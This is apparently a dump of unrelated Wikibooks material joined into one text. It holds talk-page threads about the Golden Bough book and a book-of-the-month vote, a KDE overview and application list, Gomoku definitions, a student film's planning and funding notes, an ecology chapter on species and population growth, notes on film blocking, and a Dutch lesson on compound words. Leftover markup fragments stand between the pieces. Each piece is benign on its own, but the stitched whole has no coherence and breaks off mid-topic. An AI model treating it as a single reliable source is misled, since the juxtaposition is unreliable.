:: Great! Well done. Another thing: Most of your links are displayed as &lt;nowiki&gt;==[[headings]]==&lt;/nowiki&gt;. It seems natural to do so, because you are putting headings there, but the content is somewhere else. On other Wikibooks, people struggle with other users clicking on the &quot;edit&quot; button next to those sections to edit things, some don't notice that they should click on the heading itself.
:: I therefore recommend you, to put links not into &lt;nowiki&gt;==headings==&lt;/nowiki&gt;, but use ordinary &quot;*&quot; lists for it. Also if you put all chapters between &quot;==..==&quot;, then you get a table of contents at the top of the page, which is pointless, since the same table appears below. Therefore, the cleanest thing is not to put links between &quot;==..==&quot;, but into a list. --[[User:Andreas Ipp|Andreas]] 18:48, 18 Mar 2005 (UTC)

:::I startigng noticing that, The idea is a left over from when I wanted the whole book on one page. I do like the horizontal bar that shows up after text when they are within &quot;=..=&quot; though, is there a way of having that or of not having a TOC? [[User:Ojmorales0002|Ojmorales0002]] 19:03, 18 Mar 2005 (UTC)

::::: Yes, there is a way for each of these things, but I don't think you need the line under each link on a page like [[The Golden Bough/Part 1]]. Maybe you already got used to it, but with so many chapters having each of them so big and underlined looks a little bit clumsy.. --[[User:Andreas Ipp|Andreas]] 19:25, 18 Mar 2005 (UTC)

:::: In fact I am doing away with the whole part sections and adding the chapter links to the [[The GOlden Bough]] page, I will keep the toc there so that people can jump to the old &quot;Part ...&quot; heading, to save would be readers a bit of time. It also will save space on the servers and further editing. [[User:Ojmorales0002|Ojmorales0002]] 19:19, 18 Mar 2005 (UTC)

::::: Very good. This looks much better now. --[[User:Andreas Ipp|Andreas]] 19:25, 18 Mar 2005 (UTC)

: I have requested that [[The Golden Bough/Part1]], [[The Golden Bough/Part 1]] [[The Golden Bough/Part 2]] and [[The Golden Bough/Part 3]] be deleted, I have moed the links to the main page. I am way happier with how it looks now. [[User:Ojmorales0002|Ojmorales0002]] 20:05, 18 Mar 2005 (UTC)

: I am like an idiot, I can take out the bottom lonks as well, since they are on top due to the hierarchy. [[User:Ojmorales0002|Ojmorales0002]]

:: :-) If you want even more convenience, you could use ''numbered lists'', using the &quot;#&quot; symbol instead of &quot;*&quot;, like here:
# [[The Golden Bough/The King of the Wood|The King of the Wood]]
# [[The Golden Bough/Priestly Kings|Priestly Kings]]
# [[The Golden Bough/Sympathetic Magic|Sympathetic Magic]]
:: Could also save some time, for numbering all chapters.. and later inserting a new one.. --[[User:Andreas Ipp|Andreas]] 21:18, 18 Mar 2005 (UTC)

== Where my version of The Golden Bough Belongs ==

: If I need to, is there a way of moving this book to wikisource. Although i thought wikisource was for 'source texts' not formatted or edited text. [[User:Ojmorales0002|Ojmorales0002]] 19:08, 18 Mar 2005 (UTC)

:: Yes, the way you started organizing it, it seems it is better a book for Wikisource (which contains original work by a certain author). Wikibooks is more meant for books, where each page can be edited by anyone, so I don't think this is what you want. There could be a Wikibook that explains the main ideas of the original work (like a study guide). Unfortunately there is no easy way to transfer a Wikibook to wikisource other than copying and pasting every page.. but I'd recommend you to do this sooner than later (the sooner you do it, the less you have to copy). Just ask yourself: Is it ok, if other users change the content of each of the chapters in the book (modern language, add or remove content, rewrite parts of the book, etc.), then it could be a wikibook. Or do you want to present the book as it was originally written, then it should be Wikisource, where users mainly correct spelling mistakes and the like, but not the original content. (Both are wikis, and in both wikis the book can be presented nicely). --[[User:Andreas Ipp|Andreas]] 19:25, 18 Mar 2005 (UTC)

::: Gotcha, then I think is best keep it here. I will still upload the actual text to wikisource for people to be able to use. But I want to be able to change certain things, which I, out of respect, would not want to do to the original. [[User:Ojmorales0002|Ojmorales0002]] 19:29, 18 Mar 2005 (UTC)

:: Ok, if you really want this to be a wikibook with no compromises, then I have yet another suggestion (I hope it is not getting too many... :-) ): Assume in a year somebody comes, and wants to insert a new chapter between chapter 4 and chapter 5. The person would have to move all chapters in order to renumber them, to insert a chapter. That is why the prefered way of organizing Wikibooks is, to have the title of a chapter as the link name: Use &lt;nowiki&gt;[[The Golden Bough/The King of the Wood]], [[The Golden Bough/Priestly Kings]], etc. instead of [[The Golden Bough/Chapter 1]], [[The Golden Bough/Chapter 2]], and so on&lt;/nowiki&gt;. If you want, you can still write the Chapter number on the main page, but this is then much easier to correct, if somebody wants to add or delete or move a chapter. --[[User:Andreas Ipp|Andreas]] 20:11, 18 Mar 2005 (UTC)

::: I can see a benefit in that. People can add remove, expand or compile other versions of the book (the ones in PD anyway) Thanks. [[User:Ojmorales0002|Ojmorales0002]]

:They haven't made any contributions. This is a little suspicious, because if they did they would have a contributions page.
:So, how do we 'take back' that vote?
-[[User:EuropracBHIT|EuropracBHIT]] 04:24, 18 Mar 2005 (UTC).
:: If you talk about Eyu100, he/she made 2 contributions so far: [http://en.wikibooks.org/w/index.php?title=Special:Contributions&amp;target=Eyu100 Eyu contributions], the first being the vote. Nothing wrong with that, maybe the user decided to create an account in order to vote, so that's perfectly fine (as long as it is not 10 new users suspiciously voting for the same book...) --[[User:Andreas Ipp|Andreas]] 09:47, 18 Mar 2005 (UTC)

== Voting closed - congraulations to [[US History]] - happy voting for May 2005 ==
:Yesterday, (as of midnight UTC) the voting closed.
:US History was 'clearly' in the lead with five votes, however there were 3 books on four votes out of the 12 nominated this month.
:I would like to congraulate the editors of US History for having brought to fruition the first Humanities Wikibook of the Month. I am sure you will agree when I say that history is very important to know ourselves and our future. US History is a very good Wikibook for this purpose.
:We have had some very close, interesting and competitive votes here and many well-deserving books.
:We now have the five books with more than 3 votes for May, which means US history cannot be featured for a long year.
:Who is prepared to design a picture and change the main page accordingly?
:Once again, well done and congraulations!

      <text xml:space="preserve">==Brief History==
KDE was founded in 1996 by [[w:Matthias Ettrich|Matthias Ettrich]], who was then a student at the [[w:Eberhard Karls University of Tübingen|University of Tübingen]]. He found a number of things wrong with the [[w:Unix|UNIX]] desktop at that time. Among his qualms, outlined in [http://groups.google.com/groups?selm=53tkvv%24b4j%40newsserv.zdv.uni-tuebingen.de a now-famous newsgroup post], were that none of the applications looked, felt, or worked alike to each other. He proposed the formation of not only a set of applications, but rather a [[w:desktop environment|desktop environment]], in which users could expect things to look, feel, and work consistently. He also wanted to make this desktop   easy to use. One of his complaints with desktop applications of the time was that his girlfriend could not use them. That post spurred a lot of interest, and the KDE project was born.

Matthias chose to use the [[w:Qt toolkit|Qt toolkit]] as the toolkit of choice of the KDE project. Other programmers quickly started developing KDE/Qt applications, and by early 1997, large and complex applications were being released. In mid-1997, the [[w:GNU|GNU]] project had concerns about the licensing of Qt, leading to their founding the [[w:GNOME|GNOME]] Desktop project and [[w:Harmony toolkit|Harmony]], a now-abandoned project to clone Qt. Qt was later relicensed to provide the [[w:GNU General Public License|GNU General Public License]] as an option, which has mitigated these concerns. There is still considerable disagreement over the use of the full GPL for a library like Qt, and the restrictions this imposes on code linking to it, such as the KDE framework and any applications written for it. Both KDE and GNOME now participate in [[w:Freedesktop.org|Freedesktop.org]], an effort to standardize Unix desktop interoperability, although there is still some friendly competition between them.

      <text xml:space="preserve">==Popular KDE Applications==
* '''AmaroK''' - Media player
* '''Calligra''' - Office and graphic design suite (formerly KOffice). [[w:Calligra_Suite|Calligra]] includes '''Words''' (a word processor), '''Sheets''' (a spreadsheet program), '''Stage''' (a presentation designer), [[Database Management with Kexi|Kexi]] (a database manager), '''Flow''' (a flowchart creator), '''Karbon''' (a vector graphics program), '''Krita''' (a paint program), '''Plan''' (a project manager), and '''Braindump''' (a notemaking application). 
* '''Gwenview''' - Image viewer
* '''K3b''' - CD and DVD burning application
* '''Kate''' - text editor
* '''KDevelop''' - Integrated Development Environment (IDE)
* '''Kexi''' - Integrated environment for managing data
* '''KMail''' - Email client
* '''Konsole''' - Terminal emulator
* '''Konversation''' and '''Quassel IRC''' - IRC clients
* '''Kopete''' - Instant messaging
* '''Konqueror''' - File manager and web browser using KHTML
* '''KStars''' - Desktop planetarium (accurate graphical simulation of the night sky). KStars is part of the [http://edu.kde.org KDE-Edu project].
==Making a screenshot==
[[w:Screenshot|Screenshots]] can be captured using the [[w:KSnapshot|KSnapshot]] utility. Hitting the '''PrtScn''' key activates KSnapshot.
[[File:Ksnapshot082.png|right]]
You can refine the screenshot by changing the capture mode, and clicking '''Take a New Screenshot''' (or hitting '''Alt-N''').

*'''Full Screen''' - Captures everything. (This is the default.)
*'''Window Under Cursor''' - Grabs the clicked-on window, even if another window is in front of it.
*'''Rectangular Region''' - Click and drag to select the area, and then hit '''Enter''' to return to KSnapshot and save it, or '''Esc''' to quit.
*'''Freehand Region''' - Same as '''Rectangular Region''', except that you aren't limited to a rectangle: the area you select can be any shape.
*'''Section of Window''' - The area of the window that will be captured is outlined in red. Double-click on it.

Besides PNG and JPEG, you can also save the screenshot as a BMP, EPS, JPEG-2000 (.jp2), MNG, PBM, PCX, PIC, PGM, PPM, RGB, TGA, TIFF, XBM, or XPM. You can also click the '''Copy''' button to copy it to the clipboard. The '''Send To...''' menu lets you import the image directly into another program.

      <text xml:space="preserve">KDE (K Desktop Environment) is a free desktop environment and development platform built with Trolltech's Qt toolkit. It runs on most Unix and Unix-like systems, such as Linux, BSD and Solaris. There are also ports to Mac OS X using its X11 layer and Microsoft Windows using Cygwin. A port to native Microsoft Windows using a new-from-scratch Qt toolkit is being discussed. It is developed in conjunction with KDevelop, a software development suite, and KOffice, a suite of office software.

The &quot;K&quot; originally stood for &quot;Kool&quot; (&quot;C&quot; as in &quot;cool&quot; was already given away to the Common Desktop Environment), but was changed soon after to stand simply for &quot;K&quot;, which is &quot;The first letter before 'L' (which stands for Linux) in the Latin alphabet.&quot;

=Desktop Environment: What?=
Computers are made by humans to make it easier to deal with information. Think of spreadsheets in accounting and word processors in writing lovely letters. While computers can easily store gigantic amounts of information and search and analyse it extremely fast it is difficult to represent such information in a human usable method.

Here the desktop metaphor enters. One should think of your monitor as one's office desk. It has a telephone to call other people, paper stack with your correspondence, desk drawers with your files and a garbage can for your junk.
You interact with each of these objects on your desk with physical means. You pick up a piece of paper, call the number of the top, crumple it up and drop it in the garbage or file it in the file cabinet.

To interact with your computer you usually have a monitor, a mouse and a keyboard. This is very different from the real desk where you just use your hands to pick up a document. On a computer you can’t work in this way. Here you have to move the mouse so that the corresponding mouse cursor on your monitor is hovering above a little picture that represents your document. Now you need to push the buttons on the mouse without moving its screen cursor to interact with your document.

Desktop environments are the interfaces that make such interaction of your hands through a mouse/keyboard as logical and easy as possible and display the results of your actions on the screen in a manner so that you quickly and easily understand the consequences of your actions.
KDE is a desktop environment that aims to be the best graphical interface between humans and the information they have stored in computer systems. It aims to not only provide the framework but also the applications. The framework draws on the screen, accepts user input, the applications apply such input to modify the information, and passes the results back to the framework where they are displayed.
Difficulties that are common in this method is that it takes time for a computer to do its work, so it might take some time before your actions reveal this time, called latency.  Latency is the time between input and its corresponding output. The longer this time, the less pleasing the user experience is for the user.

A second oft-sited concern of users is that buttons with the same functions are located in varying locations in the interface. KDE attempts to limit this by providing standards for the makers of the applications so that consistent interfaces are presented to the user.
Consistency is nice but consistent mysteries don’t help you! KDE tries to be clear in what the results will be of possible actions. It does so by providing pictures on buttons (icons) that represent the results of activating such buttons. However, some people don’t quickly understand icons, so straightforward text is sometimes better. KDE allows both and gives people the option of customizing their interface to their information so that they can work as effectively as possible.

And that is the goal of KDE: giving humans the most effective interface for humans to work with their information on computers.

== Games ==

* [[/Gomoku/]]
* [[/Pente/]]
* [[/Renju/]]
* [[/Wuziqi/]]

== Terms &amp; Definitions ==

''Here are some terms used in this book'':

'''Piece''': a stone (generally either black or white) belonging to one of the two players. this can be a glass stone, a plastic stone, a symbol representing a stone, etc.

'''Row''': a line of adjacent pieces which are ''all of the same colour''. gaps in this line are allowed.

'''Unbroken row''': a row without gaps.

'''n in a Row''': n pieces of the same colour arranged in a horizontal, vertical, or diagonal row. this row is unbroken. creating 5 in a row generally implies a win.

'''Four''': a row of 4 (not necessarily 4 in a row), in which placing one more piece results in a 5 in a row.

'''Straight four''': 4 in a row.

'''Three''': a row of 3 (not necessarily 3 in a row), in which placing one more piece results in a straight four.

'''Straight three''': 3 in a row.

'''Overline''': n in an unbroken row. (n &gt; 5)

'''Double three''': two ''threes'' intersecting each other

'''Double four''': two ''fours'' intersecting each other

'''Description''': Gomoku is a relatively easy game for two players. It consists of a 15 x 15 board and two sets of player pieces (one set for each player). Generally there is a set of black pieces and a set of white pieces; the 'black player' makes the first move.

'''Aim''': to get five of one's pieces in a row (horizontal, vertical, or diagonal)

'''Rules''': players alternate turns, players may not make more than one move in one turn, players may not skip their move during their turn.

'''Gameplay''': (optional) after black makes his/her second move, white may choose to play as black. (note: this is the only time in the game where players may swap the colour of their pieces)

      <text xml:space="preserve">{{MMM Header}}

While some original ideas were brainstormed, none of them were of approprate ease/length for a beginning (short) movie, often by very small amounts. A number of public domain works, mostly by [http://en.wikipedia.org/wiki/H._P._Lovecraft H. P. Lovecraft] (focusing largely on The Call of Cthulhu), were also considered and deemed difficult but possible.

The following process was (mentally) used:

# Are we able to use the story?
# Is the story interesting?
# How many characters are there? Would we have enough volunteers (read: conscripts) to make such an attempt viable?
# How easy is the story to convert from a narrative to a script format? Would a major overhaul be necessary, resulting only in general similarity; or is it easily adaptable?
# What is the setting? Are we able to find locations/costumes/etc. necessary? What grovelling/paying would be needed?
# From what perspective would we be following the story? Would we have the camera literally 'in the eye' of the protagonist, seeing what he sees; or would we use the standard omniprescent view?
# Do we have enough equipment? Is the equipment we have capable of what we want it to do?
# Can we afford it?

This was the (mental) analysis for The Call of Cthulhu (not regimented as provided below, but more collectively brainstormed):


----


The Call of Cthulhu was written in the 1920's so the copyright has expired. The story is interesting to an audience more interested in the more abstract stories, however more average audiences would probably be confused and not understand. 

The number of main characters is enough so that with a little shuffling, the film could be made. However, the most problematic thing is the extras needed (eg. police officers in raid on cultists, shipmates on voyage to R'lyeh, etc.). If techniques such as using lighting to block out the more specific features on people's faces, and actors were moved around (eg. an actor is the main in one scene/for one character, and acts as an extra in the rest), it could be achieved. Costumes would also be difficult (requiring a number of 1900's-style police uniforms, among other things), but if we asked around through our contacts in stage and acting, we might be able to scrounge up a few. If worse came to worst, we could always improvise.

The story isnt as much not in the write style to convert to script format, the conversion would simply be difficult. Hopefully, this wouldn't be that much of a problem. If the story could be simplified (see the first note) so that it is easier to understand without detracting from the story, this would be preferable.

The story will be following a number of characters, obstenibly in the search of the main for the reason for a number of unusual events, not in the least the cause of death of his great-uncle. This will involve the 'frame' of the protagonist searching out the various other characters for their stories relating to his search, and from there showing from the characters point of view the events they are describing. This would be done in a 'flashback' sort of way, not by filming events then having a narrative over the top.

The most difficult 'setting' would be the portrayal of the city of R'lyeh and Cthulhu, however we might be able to make do using miniatures for shots of the city/god itself and never actually showing actors/surroundings and either R'leyh or Cthulhu in the same shot.

Our equipment is well within range.

Seeing as though we should be able to beg and grovel for most scenes/costumes, the majority of money would probably have to be spent on the miniatures. Using off-cuts provided by contacts in various industries such as that may prove useful.

It was a few weeks later that a number of short stories (all written by the same author) were found, and an email was sent to enquire as to the possibility of adapting his works to film (Feb 23). A reply was recieved a week later giving his approval.

      <text xml:space="preserve">As a first-time independent studio depending on volunteer workers and conscripts to get by, obviously the amount of funding that could be found would be very little.

==Personal Funds==

The main source of funds for the project would be coming out of our own pockets. Fortunately, people were relatively free with volunteering things such as time, equipment (film equipment, transport, etc), etc. Actual monies needed for purchase/hire of equipment/space was thankfully not excessive.

==Grants==

The government grants provided by the Commonwealth of Australia target directors of age above mine, as well as being heavily biased towards directors which have already completed a number of films.

==Fundraising==

With no large volunteer force, no goods/services and no target consumer group, the fundraising idea was essentially scrapped from the beginning.

==Backing==

Finding a person or group willing to back this project are much of the same attitude as the government, unwilling to invest in a risky, unproven young group of people.

Thankfully for us, our limited number of contacts meant that we would be able to beg and plead for rights to film at certain locations, in return for a spot thanking the benefactors on the credits. The rest (equipment, transport, etc) was easily managed through our minimal funds.

== Speedy renaming of [[Template:Adakw]] to [[Template:Ada/kw]] ==

'''Note''': Moved from [[WB:VFD]] - [[User:Aya|Aya]]&amp;nbsp;&lt;sup&gt;[[User talk:Aya|T]]&amp;nbsp;[[Special:Emailuser/Aya|E]]&amp;nbsp;[[Special:Contributions/Aya|C]]&lt;/sup&gt; 16:12, 25 August 2005 (UTC)

This do not require a vote, but I don't known other place to ask to move this page. We are migrating the entire [[Ada Programming]] wikibook (formerly [[Programming:Ada]]) to the new naming policy, and we have the alias [[Ada]] for templates. To avoid polluting the namespace, all the pages of the wikibook will be subpages of those two domain names ([[Ada Programming]] and the alias [[Ada]]).

We need the help of an administrator to move the [[Template:Adakw]] to [[Template:Ada/kw]]. After that, the old template [[Template:Adakw]] should be deleted, as well as many other template names listed in the [[:Category:Candidates for speedy deletion]]. Please, do not use any template to indicate the requested renaming or removing because currently the second is a redirection to the first, and it's heavily used. Thank you very much. --[[User:Suruena|surueña]] 10:27, August 25, 2005 (UTC)

:I don't understand why you need an administrator to do this. Simply edit the page [[Template:Ada/kw]] to contain whatever it is you want it to contain, then mark the old template for deletion when it's no longer required. Perhaps I'm missing something here? - [[User:Aya|Aya]]&amp;nbsp;&lt;sup&gt;[[User talk:Aya|T]]&amp;nbsp;[[Special:Emailuser/Aya|E]]&amp;nbsp;[[Special:Contributions/Aya|C]]&lt;/sup&gt; 16:12, 25 August 2005 (UTC)</text>

[[Image:World-Population-500CE-2150.png|thumb|300px|World population from 500CE to 2150, based on UN (2004){{ref|UN}} projections and U.S. census information{{ref|census}}, which are both applications of demography. No matter how much data is collected, unknown variables remain, so there are alternate possiblities for the future world population.]]Species and populations are probably the two most commonly used ecology terms, but they are often difficult concepts to grasp.  Throughout this chapter, they will be discussed in detail, expanding on the definitions from previous chapters and explaining why there are no universally acceptable definitions.  Factors influencing population growth and ways to measure and predict population growth will also be subjects of specific focus.  Populations can be affected by so many factors that it is almost impossible to take every variable into account.  Demography is the statistical study of the age structure of a population, and it can be used in research to determine what is causing a decline or increase in population size over time.  It is worthwhile to understand species concept and population growth even though they are such broad aspects, because they are fundamental to the science of ecology.

== Species Concept ==
You should have familiarity with the species concept from biology and have been presented with this basic tenant of the biological sciences in [[../Biosphere_Organization#Species and Habitat|Chapter 2]] of this textbook. If need be,
:* Reread [[Wikipedia:Species|Species]] (&lt;small&gt;Follow links as necessary to understand concepts presented&lt;/small&gt;)

When initially considering the concept of species you may wonder why the division of organisms into species is necessary at all. According to [[Wikipedia:en:Ernst W. Mayr|Ernst W. Mayr]], a renowned evolutionary biologist, the existence and reproductive characteristics of distinct species &quot;prevents the production of too great a number of disharmonious incompatible gene combinations.{{ref|Mayr1996}}&quot;  Therefore, the basis for the existence of species is genotypic in nature.  However, the existence of species is not traditionally doubted whereas the appropriate definition of a species is continually a topic of debate{{ref|Hey2001}}.

[[Image:Maultier_grau.jpg‎|thumb|left|A mule is the infertile offspring of a horse and a donkey--an example of the gray area regarding interbreeding in the most common definition of a species.]]Although a species can be defined in a number of different ways, the most common definition for a living species, suggested by [[Wikipedia:en:Ernst W. Mayr|Ernst W. Mayr]], is ''any group of individuals that can breed with themselves but not with any other group''. In other words, a species is any group of individuals that is &quot;reproductively isolated.{{ref|Mayr1996}}&quot; This definition, termed the Biological Species Concept, has limitations and exceptions{{ref|Hey2001}}. Some animals that would not normally be considered part of the same species can breed with limited success. For example, a horse and a donkey can can breed to produce a mule offspring but, the mule is infertile. Accordingly, there is much debate regarding the amount of successful fertility required for two individuals to belong to the same species. There are also organisms that do not interbreed at all, but propagate through direct cloning of an individual, for example many plants and insects. Other definitions must be used to define the species of organisms such as these.

So, why is such a seemingly straight-forward concept so hard to define? One problem is that the definition of a species is used in many different contexts and undoubtedly fails to satisfy them all simultaneously. In particular, there has been a great deal of discontinuity between the application of the same species concept in a taxonomic or systematic sense and in an evolutionary sense{{ref|Cracraft1989}}. In systematic biology species serve as fundamental units (taxa) for the description and historical progression of diversity.  However, evolutionarily, species are considered only as elements of a process called speciation. Even without further knowledge of the differences between evolution and [[Wikipedia:en:taxonomy|taxonomy]], it is apparent that the concept of a species is used in different contexts by the two. This is just one example of the many obstacles encompassing the complex debate for a universally applicable definition of a species.

In fact, it seems, after years and years of debate, that it is impossible to attain a universally suitable definition for &quot;species&quot;. As Pigliucci (2006, p. 50) points out:
:''...emotions have run high for decades on the &quot;crucial&quot; question of what a biological species is, while at the same time plenty of researchers have conducted brilliant studies on individual species and on the process of speciation, apparently unencumbered by the lack of a universally-agreed-upon definition of what species are...''

The species concept is basic to biology and therefore ecology, but it is really the '''species population''' that ecologists study.

[[Image:Pygoscelis papua on Petermann Island.jpg|thumb|360px|right|Part of a penguin (''Pygoscelis papua'') population in Antarctica]]

== Population Biology ==
A ''species population'' is a discrete group of potentially interbreeding organisms in the same species in a given locality. Here, potential interbreeding has nothing to do with measures of fertility; instead it is a statement that all members of a population are potentially a part of a single gene pool. In a species populations there are many factors which interfere with an individual’s ability to survive and reproduce know as their [[../Main Glossary|&quot;Fitness&quot;]].. Booth et al.(1995){{ref|Booth1995}} describes that an individual's fitness is increased with group living, also known as the [[Wikipedia:en:Allee effect|Allee Effect]], and that an individual’s ability to survive will be increased by their size and rank. In this study, Booth shows that within the group of damselfish there was a greater chance for survival if they stayed in large groups. Within these groups the smaller individuals would benefit the most from the group living, but consequently the growth of these individuals was reduced, thus taking a longer time to reach a higher social status in the group. Reed et al. 2005 {{ref|Reed2005}} supports Booth's findings,and also shows that there is a linear relationship between log population size and population fitness. Reed suggests that “conservation efforts should ultimately aim at maintaining populations of several thousand individuals to ensure long-term persistence.&quot;  

:* Read [[Wikipedia:en:Population|Population]] &lt;small&gt;The common use of the term in human demographics utilizes concepts and terms important to Population Biology&lt;/small&gt;

Diversity as a goal is split between species diversity, and diversity within a population. An area that is filled with finches and owls and many species has species diversity. But if all the finches have very similar genes, or if the population has an inbreeding problem, there is not enough diversity within that population.
[[image:Founder_effect.png|thumb|280px|left|Limited diversity with separation.]]
When there is no diversity in the gene pool, serious effects can result. This is known as the [[Wikipedia:en:Founder_effect|Founder Effect]]. A major cause of Founder Effect is when a small part of a population have moved to an area with limited interaction with species from the same population. A well known example is the Old Order [[Wikipedia:en:Amish|Amish]] in Pennsylvania. The Amish rarely interact with people outside of the community and rarely, if ever, marry outside of the population. With the limited gene variation genotype and phenotype problems are spread more frequently through the population and are not bred out compared with the rest of the overall population. The Amish carry a rare allele that causes [[Wikipedia:en:Polydactyly|polydactylism]], in which there are extra fingers or toes. This recessive allele is carried in about 1 in every 14 Amish individuals compared to the outside population, where it is carried about 1 in every 1000.

Another similar type of disturbance in a population is known as a [[Wikipedia:en:Population_bottleneck|Bottleneck]]. This disturbance occurs when a species is almost eliminated by human forces (hunting) or natural disasters. The cheetah is a prime example of a species with limited variation from a bottleneck. The cheetah's genetic make-up is so similar that a skin graft will not be rejected from one cheetah to another.

Even though the worldwide population of a species is effectively infinite, not all individuals can interbreed, due to obvious limitations such as separate continents, mountains or deserts, or great distances. A local population that does actually interbreed is called a neighborhood, or deme. So even though an overall population may not have inbreeding, neighborhoods would have potentially high inbreeding coefficients, which can increase the frequency of diseases, or ensure that a mutation be preserved in that species.

===Population Growth===
[[image:Life_expectancy_world_map.PNG|thumb|340px|right|Population growth data can be used to determine and compare life expectancies of many regions.]]Population growth is measured using time-specific life tables and age-specific life tables. Time-specific life tables are used for long lived species, such as humans, and age-specific table are used for short-lived species, such as insects. Time-specific life tables assume equal birth rates for all age classes, and are useful for large populations. Age-specific life tables follow a cohort (a group of organisms of the same species and roughly similar ages), and require periodic sampling. It is effective for short-lived species such as annual plants and insects.
There are many types of useful information that population growth can reveal, such as life histories for a population, and life expectancies such as the map shown at right. Survivorship curves can also be determined by plotting the number of individuals of a cohort against time. Fecundity can be influenced by abiotic factors, such as precipitation (Milanovich et al. 2006).

===Reproductive Rates===
Closely related to the study of population growth is the reproductive rate of a population. [[Wikipedia:en:Fecundity|Fecundity]], m&lt;sub&gt;x&lt;/sub&gt; is the average number of offspring produced per breeding individual. A fecundity schedule is R&lt;sub&gt;0&lt;/sub&gt; = ∑ l&lt;sub&gt;x&lt;/sub&gt;m&lt;sub&gt;x&lt;/sub&gt; , where l&lt;sub&gt;x&lt;/sub&gt; is n&lt;sub&gt;x&lt;/sub&gt;/n&lt;sub&gt;0&lt;/sub&gt; (the proportion surviving), m&lt;sub&gt;x&lt;/sub&gt; is the mean number of offspring per individual, and R&lt;sub&gt;0&lt;/sub&gt; is the net reproductive rate of the population. If R&lt;sub&gt;0&lt;/sub&gt;=1, the population is stable. If R&lt;sub&gt;0&lt;/sub&gt;&lt;1, the population is decreasing, and if R&lt;sub&gt;0&lt;/sub&gt;&gt;1, the population is increasing.

== Sub-page scope ==

How big a scope do people want to give these sub-pages? On the one end of the spectrum, we could have big pages with lots of tables (like the proposed natural sciences page) which would reduce the number of pages one might have to browse through. On the other end, we could make very short pages so that once one has found the page, there won't be much clutter and the words of interest easily found.

I would lean towards smaller pages. I have nothing against longer ones and see no reason why we couldn't make a natural sciences page by including the relevant pages. I like the modular approach, but realise that it does introduce a certain amount of clutter on indexing pages.

Anyone have good arguments that tip the scales for one or the other, or a good compromise that will give the right tune. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 09:48, 18 July 2008 (UTC)

: How about setting a limit of vocabulary under a particular topic until it's made into a subpage.  Astronomy and Glaciology (which is a subset of Earth Science) are all Natural Sciences.  However, putting Glaciology and Astronomy directly under Natural Sciences would develop a rather large page.  Making a limit would remove the clutter from the main Natural Science page and limit the need to make numerous subpages.

: The only real problem I have is that some terms may go under multiple pages (and the main reason I decided to go with one page.)  In the Natural Science page, it's easier to solve.  All terms should go under the science they're directly related.  For example, carbon monoxide is used under Glaciology.  This is clearly a chemistry term - even though it's used in the Glaciology community.  Similarly, &quot;solid&quot; should go under &quot;Chemistry&quot; even though many others would also use the term.  Other terms may be more difficult - biochemistry (is this a Biology term?  Chemistry?), Telescope (Astronomy or Physics?), Microscope (Biology, Chemistry or Physics?).  What one person believes the term should belong, another person would disagree.  This makes it rather difficult for people to find terms they believe should belong in one section.  I guess there could be a section called &quot;Interdisciplinary Section&quot; or something similar. --[[User:Retropunk|Retropunk]] ([[User talk:Retropunk|talk]]) 04:18, 19 July 2008 (UTC)

:: Sure, a limit could work. I'm not sure if a strict limit would be useful ... there are always situations where it's good to be able to bend the rules.
:: I don't see this problem so easily solved by putting it under a Natural Science page. You still have to section them off if you want to make browsing possible. An alphabetical list would allow for searching, but at that point we're approaching a dictionary, which Wikibooks is not.
:: I see these vocab lists more as a resource to practice phrases with new words and less as a tool to build up vocabulary (which is probably best done by the students themselves in their own context). For that end, we would be better off with a few short lists of related words per page with links to related content to allow for browsing.
:: It's true that many terms can fit under multiple categories. Since we're building a learning resource rather than a word index, I'd say that multiple entries of the same word in different lists is perfectly fine.
:: For searching, we could see if we can put a Wiktionary searchbox on the vocab pages. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 02:12, 31 July 2008 (UTC)</text>

Blocking is the act of walking the actors through the scene before it is shot in order to make sure the lighting is sufficient and the camera is able to get the desired focus required. 
That's close: Blocking is for all departments to be sure that they are prepared for the scene to be shot. Taking the extra 3-5 minutes to block a scene can save you time, money and patience later. It's not uncommon for blocking to last days for a big scene, such as the scene in Jarhead where the soldiers all met in a tent &quot;in country&quot;. Sam Mendes blocked that scene for 4 days before they shot it. Still closer: Blocking a scene for film also must afford the camera the most aesthetically interesting compositions that flow before the lens. It is not only the movement of actors and props to achieve optimum efficiency on the set.
Blocking is simply working out the details of an actor’s moves in relation to the camera.  

What happens in an effective scene is a combination of a number of elements, in a kind of gestalt.  All these elements together comprise blocking.  These include cinematographic details, the physical relationship of the actors to each other, their energy, and the overall sense of where they are going.  What is the chemistry or dynamic in the &quot;frame?&quot;  Simply put, what is the set-up..especially in terms of the action and how everything fits together, spatially and otherwise?

==Grammatica 7.1 Compounds==
In this chapter you will learn how to glue words together. Dutch, like German, Norwegian and Danish, is often mocked for the (theoretical) possibility of creating long words such as randjongerenhangplekkenbeleidsambtenarensalarisbesprekingsafspraken (the agreements for the negotiations concerning the salary of public officials who decide on the policy regarding areas where unemployed youth are allowed to hang out). 

Actually compounds are seldom so excessive and the compounding of words happens in English as well. However in English, compounds are written as separate words, so English speakers are often not aware that a word like &quot;apple juice&quot; is a compound, much like its Dutch counterpart &quot;appelsap&quot;. Notice that when you pronounce &quot;apple juice&quot; you pronounce the word &quot;juice&quot; with much less emphasis than you pronounce &quot;apple&quot; with. This is what signals word compounding in English and Dutch alike.

Sometimes, compounds are spelled as a single word even in English. For example, the word &quot;database&quot; is a compilation of the words &quot;data&quot; and &quot;base&quot;. For some words, such as &quot;mailbox&quot;, a double spelling can be used: &quot;mail box&quot; is also acceptable in English. 

In Dutch, the rule for spelling compounds is simple: if two nouns form a compound, write them together. Always.

Examples:

*apple juice → [[:wikt:nl:appelsap|appelsap]], wrong: appel sap
*mail box → [[:wikt:nl:postbus|postbus]], wrong: post bus
*Linux operating system → Linuxbesturingssysteem, wrong: Linux besturingssysteem

Should a word get unreadable by writing it together, you can use a dash to make it more readable. In the latter case Linux-besturingssysteem is more usual because Linux is a brand name. Dashes are used sparingly and never in simple compounds like deurbel (door bell).

This rule even applies to words imported from English into Dutch: 

*sciencefiction
*businessunit

This dash is required when one of the elements in a compound is an acronym:

*DNA molecule → DNA-molecuul, wrong: DNA molecuul

If you use two compound words in the same phrase that have an element in common, you can replace it by a dash:

*&quot;[[:wikt:nl:ondergrens|ondergrens]] en [[:wikt:nl:bovengrens|bovengrens]]&quot; (lower boundary and upper boundary) can be replaced by &quot;onder- en bovengrens&quot;. (lower and upper boundary)

